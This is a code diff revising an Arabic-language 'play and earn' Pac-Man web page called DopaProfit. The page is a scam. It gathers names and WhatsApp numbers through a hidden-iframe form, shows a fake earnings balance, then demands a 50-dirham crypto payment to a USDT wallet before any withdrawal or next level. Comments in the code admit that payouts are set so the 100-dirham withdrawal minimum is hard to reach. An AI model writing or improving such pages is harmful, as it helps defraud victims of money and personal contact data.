@@ -3,138 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DopaProfit | العب واربح</title>
+    <title>DopaProfit - Play & Earn</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --blue: #1b213e; --yellow: #ffc107; --gray: #f4f7f9; }
-        body { background: var(--blue); color: #fff; font-family: 'Cairo', sans-serif; margin: 0; overflow-x: hidden; }
-        .page { display: none; padding: 20px; text-align: center; }
-        .active { display: block; }
+        :root { --blue: #1b213e; --yellow: #ffc107; }
+        body { background: #0a0e1a; color: white; font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
         
-        /* تصميم صفحة التسجيل */
-        .reg-card { background: #fff; color: var(--blue); padding: 30px; border-radius: 20px; max-width: 400px; margin: 50px auto; }
+        #reg-page { background: white; color: var(--blue); padding: 30px; border-radius: 20px; width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; background: var(--yellow); border: none; border-radius: 8px; font-weight: 900; cursor: pointer; }
+        .btn { width: 100%; padding: 15px; background: var(--yellow); border: none; border-radius: 8px; font-weight: 900; cursor: pointer; color: var(--blue); font-size: 16px; }
 
-        /* تصميم اللعبة */
-        #game-container { position: relative; width: 340px; height: 340px; background: #000; margin: 20px auto; border: 4px solid var(--yellow); position: relative; }
-        .pacman { width: 20px; height: 20px; background: var(--yellow); border-radius: 50%; position: absolute; }
-        .dot { width: 4px; height: 4px; background: #fff; position: absolute; border-radius: 50%; }
+        #game-page { display: none; text-align: center; }
+        .stats { background: rgba(255,255,255,0.1); padding: 10px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-around; font-size: 18px; }
+        canvas { background: #000; border: 4px solid var(--yellow); border-radius: 10px; box-shadow: 0 0 20px var(--yellow); }
         
-        /* لوحة التحكم بالنقاط */
-        .stats-bar { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; display: flex; justify-content: space-around; margin-bottom: 20px; }
-        .balance-box { font-size: 20px; font-weight: 900; color: var(--yellow); }
-
-        /* نافذة السحب والشحن */
-        .modal { background: #fff; color: var(--blue); padding: 20px; border-radius: 15px; margin-top: 20px; display: none; }
-        .usdt-address { background: #eee; padding: 10px; font-size: 12px; word-break: break-all; border: 1px dashed #333; }
+        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; color: var(--blue); padding: 25px; border-radius: 15px; width: 300px; display: none; z-index: 100; box-shadow: 0 0 100px rgba(0,0,0,0.8); }
+        .wallet { background: #eee; padding: 10px; border-radius: 5px; font-size: 11px; word-break: break-all; margin: 10px 0; border: 1px dashed red; }
     </style>
 </head>
 <body>
 
-<div id="page1" class="page active">
-    <div class="reg-card">
-        <h2 style="margin-top:0;">DOPA <span>PROFIT</span></h2>
-        <p>سجل حسابك لفتح لعبة الأرباح</p>
-        <form id="regForm" target="hidden_iframe" onsubmit="submitted=true;">
-            <input name="entry.1954971449" id="user_name" placeholder="الاسم الكامل" required type="text"/>
-            <input name="entry.2124666075" placeholder="البريد الإلكتروني" required type="email"/>
-            <input name="entry.1410046301" placeholder="رقم الواتساب" required type="tel"/>
-            <input name="entry.1652417255" id="c_field" type="hidden"/>
-            <button class="btn" type="submit">دخول اللعبة</button>
-        </form>
-    </div>
+<div id="reg-page">
+    <h2 style="margin:0;">DOPA <span>PROFIT</span></h2>
+    <p>سجل حسابك لفتح لعبة جمع الأموال</p>
+    <form id="regForm" target="hidden_iframe" onsubmit="startSystem()">
+        <input name="entry.1954971449" id="user_name" placeholder="الاسم الكامل" required type="text"/>
+        <input name="entry.1410046301" placeholder="رقم الواتساب" required type="tel"/>
+        <input name="entry.1652417255" id="c_field" type="hidden"/>
+        <button class="btn" type="submit">بدء اللعب والربح</button>
+    </form>
 </div>
 
-<div id="page2" class="page">
-    <div class="stats-bar">
+<div id="game-page">
+    <div class="stats">
         <div>النقاط: <span id="score">0</span></div>
-        <div class="balance-box">الرصيد: <span id="money">0.00</span> د.م.</div>
+        <div style="color:var(--yellow);">الرصيد: <span id="money">0.00</span> د.م.</div>
     </div>
-
-    <div id="game-container">
-        <div id="pacman" class="pacman"></div>
-    </div>
+    <canvas id="gameCanvas" width="360" height="360"></canvas>
+    <p style="font-size:12px; color:#aaa; margin-top:10px;">استخدم أزرار الهاتف أو لوحة المفاتيح للتحرك</p>
     
-    <p style="font-size:12px;">استخدم أزرار الاتجاهات للتحرك وجمع النقاط</p>
-    <div style="display:grid; grid-template-columns: repeat(3, 1fr); width:150px; margin: 0 auto; gap:5px;">
-        <button onclick="move('up')" style="grid-column: 2;">▲</button>
-        <button onclick="move('left')">◀</button>
-        <button onclick="move('down')">▼</button>
-        <button onclick="move('right')">▶</button>
+    <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:10px; width:180px; margin:10px auto;">
+        <button class="btn" style="grid-column:2" onclick="changeDir('up')">UP</button>
+        <button class="btn" onclick="changeDir('left')">LEFT</button>
+        <button class="btn" onclick="changeDir('down')">DOWN</button>
+        <button class="btn" onclick="changeDir('right')">RIGHT</button>
     </div>
-
-    <button onclick="showWithdraw()" class="btn" style="margin-top:20px; background:#48bb78; color:#white;">سحب الأرباح (الحد الأدنى 100 د.م.)</button>
-
-    <div id="withdrawModal" class="modal">
-        <h3>رصيدك غير كافٍ للسحب</h3>
-        <p>يجب شحن "طاقة الحساب" للوصول للحد الأدنى. أرسل **50 درهم** لتفعيل السحب السريع.</p>
-        <p>عنوان محفظة <b>Tether (USDT-TRC20)</b>:</p>
-        <div class="usdt-address">TXXXXXXXXXXXXX_YOUR_WALLET_HERE</div>
-        <p style="font-size:10px; color:red;">* بعد الشحن، أرسل صورة التحويل للدعم الفني.</p>
-        <button onclick="this.parentElement.style.display='none'" class="btn">إغلاق</button>
-    </div>
+    <button onclick="showWithdraw()" class="btn" style="background:#48bb78; color:white; margin-top:10px;">سحب الأرباح فوراً</button>
 </div>
 
-<iframe name="hidden_iframe" style="display:none;" onload="if(typeof submitted !== 'undefined') startGame();"></iframe>
+<div id="withdrawModal" class="modal">
+    <h3 style="margin-top:0;">الرصيد غير كافٍ!</h3>
+    <p>عذراً، الحد الأدنى للسحب هو <b>100 درهم</b>. لشحن الطاقة وتسريع الأرباح، قم بإرسال <b>50 درهم</b>.</p>
+    <div class="wallet">عنوان USDT (TRC20):<br><b>TXXXXXXXX_YOUR_ADDRESS_HERE</b></div>
+    <p style="font-size:12px;">أرسل صورة التحويل للدعم لتفعيل السحب.</p>
+    <button class="btn" onclick="closeModal()">موافق</button>
+</div>
+
+<iframe name="hidden_iframe" style="display:none;"></iframe>
 
 <script>
-    let submitted = false;
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
     let score = 0;
     let balance = 0;
-    let pacPos = { x: 160, y: 160 };
+    const size = 20;
+    let pacman = { x: 20, y: 20, dir: 'right' };
+    let dots = [];
 
-    function startGame() {
-        document.getElementById('page1').classList.remove('active');
-        document.getElementById('page2').classList.add('active');
-        createDots();
-    }
-
-    // توليد النقاط في اللعبة
-    function createDots() {
-        const container = document.getElementById('game-container');
-        for(let i=0; i<30; i++) {
-            let dot = document.createElement('div');
-            dot.className = 'dot';
-            dot.style.left = Math.random() * 320 + 'px';
-            dot.style.top = Math.random() * 320 + 'px';
-            container.appendChild(dot);
+    // إنشاء النقاط (Coins)
+    for(let i=1; i<17; i++) {
+        for(let j=1; j<17; j++) {
+            if(Math.random() > 0.3) dots.push({ x: i*20, y: j*20 });
         }
     }
 
-    function move(dir) {
-        const step = 20;
-        if(dir === 'up' && pacPos.y > 0) pacPos.y -= step;
-        if(dir === 'down' && pacPos.y < 320) pacPos.y += step;
-        if(dir === 'left' && pacPos.x > 0) pacPos.x -= step;
-        if(dir === 'right' && pacPos.x < 320) pacPos.x += step;
-        
-        document.getElementById('pacman').style.left = pacPos.x + 'px';
-        document.getElementById('pacman').style.top = pacPos.y + 'px';
-        
-        // نظام النقاط: كل حركة تزيد نقطة واحدة
-        score += 1;
-        balance = (score * 0.001).toFixed(2); // كل نقطة بـ 0.001 درهم (صعب جداً يوصل لـ 100)
-        
-        document.getElementById('score').innerText = score;
-        document.getElementById('money').innerText = balance;
+    function startSystem() {
+        const name = document.getElementById('user_name').value;
+        document.getElementById('c_field').value = "DOPA-" + name.substring(0,3).toUpperCase() + "-" + Math.floor(1000+Math.random()*9000);
+        document.getElementById('reg-page').style.display = 'none';
+        document.getElementById('game-page').style.display = 'block';
+        gameLoop();
+    }
 
-        // عائق: بعد 500 نقطة اللعبة تتوقف وتطلب شحن
-        if(score > 500) {
-            alert("انتهت طاقة اللعب اليومية! يجب الشحن لمواصلة جمع الأرباح.");
+    function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        
+        // رسم النقاط
+        ctx.fillStyle = "white";
+        dots.forEach(dot => {
+            ctx.beginPath();
+            ctx.arc(dot.x + 10, dot.y + 10, 3, 0, Math.PI*2);
+            ctx.fill();
+        });
+
+        // رسم باكمان
+        ctx.fillStyle = "#ffc107";
+        ctx.beginPath();
+        ctx.arc(pacman.x + 10, pacman.y + 10, 9, 0.2 * Math.PI, 1.8 * Math.PI);
+        ctx.lineTo(pacman.x + 10, pacman.y + 10);
+        ctx.fill();
+    }
+
+    function update() {
+        if(pacman.dir === 'right' && pacman.x < 340) pacman.x += 2;
+        if(pacman.dir === 'left' && pacman.x > 0) pacman.x -= 2;
+        if(pacman.dir === 'up' && pacman.y > 0) pacman.y -= 2;
+        if(pacman.dir === 'down' && pacman.y < 340) pacman.y += 2;
+
+        // أكل النقاط وتحويلها لدرهم
+        dots = dots.filter(dot => {
+            const dist = Math.hypot(pacman.x - dot.x, pacman.y - dot.y);
+            if(dist < 10) {
+                score++;
+                balance = (score * 0.05).toFixed(2); // كل نقطة بـ 0.05 درهم
+                document.getElementById('score').innerText = score;
+                document.getElementById('money').innerText = balance;
+                return false;
+            }
+            return true;
+        });
+
+        if(dots.length === 0) {
+            alert("مبروك! لقد أنهيت المرحلة. اشحن حسابك لفتح المرحلة التالية وسحب أرباحك.");
             showWithdraw();
         }
     }
 
-    function showWithdraw() {
-        document.getElementById('withdrawModal').style.display = 'block';
+    function changeDir(d) { pacman.dir = d; }
+    function showWithdraw() { document.getElementById('withdrawModal').style.display = 'block'; }
+    function closeModal() { document.getElementById('withdrawModal').style.display = 'none'; }
+
+    function gameLoop() {
+        draw();
+        update();
+        requestAnimationFrame(gameLoop);
     }
 
-    document.getElementById('regForm').onsubmit = function() {
-        const name = document.getElementById('user_name').value;
-        document.getElementById('c_field').value = "DOPA-" + name.substring(0,3).toUpperCase() + "-" + Math.floor(Math.random()*9000);
-        submitted = true;
-    };
+    // دعم لوحة المفاتيح
+    window.addEventListener('keydown', e => {
+        if(e.key === 'ArrowUp') changeDir('up');
+        if(e.key === 'ArrowDown') changeDir('down');
+        if(e.key === 'ArrowLeft') changeDir('left');
+        if(e.key === 'ArrowRight') changeDir('right');
+    });
 </script>
 
 </body>
